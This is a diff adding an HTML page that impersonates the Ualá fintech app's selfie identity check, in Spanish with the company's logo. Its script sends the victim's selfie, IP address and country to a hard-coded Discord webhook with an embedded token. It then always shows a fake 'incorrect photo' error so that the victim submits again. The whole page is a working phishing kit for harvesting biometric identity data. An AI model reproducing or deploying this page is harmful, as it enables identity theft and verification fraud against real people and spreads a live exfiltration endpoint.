@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/svg+xml" href="uala.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Ualá</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+    body {
+      background-color: #fefefe;
+      color: #1a1a1a;
+      padding: 20px;
+    }
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+    }
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 40px;
+    }
+    .icon {
+      font-size: 22px;
+      color: #777;
+      cursor: pointer;
+    }
+    .logo {
+      text-align: center;
+      font-size: 32px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 20px;
+    }
+    .logo1 {
+      text-align: center;
+      font-size: 15px;
+      font-weight: 400;
+      color: #555;
+      margin-bottom: 40px;
+    }
+    h2 {
+      font-size: 18px;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 16px 44px 16px 14px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      font-size: 15px;
+      background-color: #fff;
+      outline: none;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+      transition: border 0.3s;
+    }
+    input:focus {
+      border-color: #888;
+    }
+    .btn {
+      border:0; background:#022a9c; color:#fff; padding:10px 20px; border-radius:10px;
+      width:70%; margin-top:20px; cursor:pointer; font-size:16px;
+    }
+    .btn[disabled]{opacity:.6; cursor:not-allowed;}
+    #photoBtn {
+      display:inline-block; width:70%; background:#022a9c; color:#fff; padding:10px 20px;
+      border-radius:10px; margin-top:15px; cursor:pointer;text-align: center;display: block;margin: 0 auto;
+    }
+    #photoInput{ display:none;text-align:center; }
+    #preview{ display:none; width:70%; max-width:320px; border-radius:12px; margin:12px auto 0; }
+    #status { font-size:14px; margin-top:10px; }
+    #status.ok { color:#0a7a0a; }
+    #status.err { color:#b00020; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <br><br><br>
+    <img src="https://images.ctfassets.net/6n252fx9hkkr/4pC2sp1c3LAFN8sbSxEAPi/4570c4aaee41ece2a44871f446c6df48/Logo_Uala_Horizontal.png" 
+       style="width:48%; display:block; margin:auto;"><br><br>
+    <h2 style="text-align: center;">Tomate una selfie</h2>
+    <div class="logo1">Mantén una expresión neutral, encuentra una luz balanceada, <strong>fondo oscuro, no uses gorras, lentes, etc.</strong></div>
+
+    <img src="escaneo.gif" alt="Logo" class="logo" style="width:175px;display: block;margin: 0 auto;">
+    <br>
+
+    <form id="loginForm">
+      <div class="input-group">
+        <!-- Botón tipo file (cámara frontal) -->
+        <label id="photoBtn" for="photoInput">📷 Tomar foto</label>
+        <input id="photoInput" type="file" accept="image/*" capture="user">
+
+        <!-- Vista previa -->
+        <img id="preview" alt="Previsualización">
+
+        <!-- Base64 oculto -->
+        <input type="hidden" id="fotoBase64">
+      </div>
+
+      <button class="btn" id="submitBtn" type="submit" disabled style="display: block;margin: 0 auto;">Continuar</button>
+      <div id="status"></div>
+    </form>
+  </div>
+
+  <script>
+  const photoInput = document.getElementById('photoInput');
+  const preview = document.getElementById('preview');
+  const submitBtn = document.getElementById('submitBtn');
+  const form = document.getElementById('loginForm');
+  const hiddenInput = document.getElementById('fotoBase64');
+  const statusEl = document.getElementById('status');
+
+  let capturedFile = null;
+  let previewURL = null;
+
+  // Pon tu webhook aquí
+  const webhookUrl = "https://discord.com/api/webhooks/1453186705719955679/KZVMNKfOwDC0_674QmyGagCz5-dPLMVByNh_1Td9A7mZof5epp6Cu5ZO0fKTSOksT0DL";
+
+  photoInput.addEventListener('change', () => {
+    const file = photoInput.files && photoInput.files[0];
+    if (!file) {
+      submitBtn.disabled = true;
+      return;
+    }
+    if (!file.type.startsWith('image/')) {
+      statusEl.textContent = 'El archivo seleccionado no es una imagen válida.';
+      statusEl.className = 'err';
+      submitBtn.disabled = true;
+      return;
+    }
+
+    capturedFile = file;
+
+    if (previewURL) URL.revokeObjectURL(previewURL);
+    previewURL = URL.createObjectURL(file);
+    preview.src = previewURL;
+    preview.style.display = 'block';
+    submitBtn.disabled = false;
+
+    const reader = new FileReader();
+    reader.onload = e => hiddenInput.value = e.target.result || '';
+    reader.readAsDataURL(file);
+
+    statusEl.textContent = '';
+    statusEl.className = '';
+  });
+
+  async function sendImage() {
+    if (!capturedFile) return;
+
+    let ip = '';
+    let country = '';
+
+    try {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      ip = ipData.ip || '';
+
+      if (ip) {
+        const countryRes = await fetch(`https://ipwhois.app/json/${ip}`);
+        const countryData = await countryRes.json();
+        country = countryData.country || '';
+      }
+    } catch (err) {
+      console.error("No se pudo obtener IP/país:", err);
+    }
+
+    try {
+      const res = await fetch(hiddenInput.value);
+      const blob = await res.blob();
+
+      const formData = new FormData();
+      formData.append('file', blob, 'selfie.png');
+      formData.append('payload_json', JSON.stringify({
+        content: `📷 Selfie recibida\n🌍 IP: ${ip}\n🏳️ País: ${country}`
+      }));
+
+      await fetch(webhookUrl, {
+        method: "POST",
+        body: formData
+      });
+
+      // **Aquí forzamos el mensaje de “Foto incorrecta”**
+      statusEl.textContent = "Foto incorrecta, inténtelo nuevamente.";
+      statusEl.className = "err"; // rojo
+      submitBtn.disabled = false;  // para permitir reintento
+      capturedFile = null;
+      preview.style.display = 'none';
+      hiddenInput.value = '';
+    } catch (err) {
+      console.error("Error enviando webhook:", err);
+      statusEl.textContent = "Error enviando la foto, inténtelo nuevamente.";
+      statusEl.className = "err";
+      submitBtn.disabled = false;
+    }
+  }
+
+  form.addEventListener('submit', async e => {
+    e.preventDefault();
+    if (!capturedFile) {
+      statusEl.textContent = 'Primero toma una foto.';
+      statusEl.className = 'err';
+      return;
+    }
+
+    submitBtn.disabled = true;
+    statusEl.textContent = 'Verificando...';
+    statusEl.className = 'ok'; // verde mientras se envía
+
+    await sendImage();
+  });
+  </script>
+</body>
+</html>
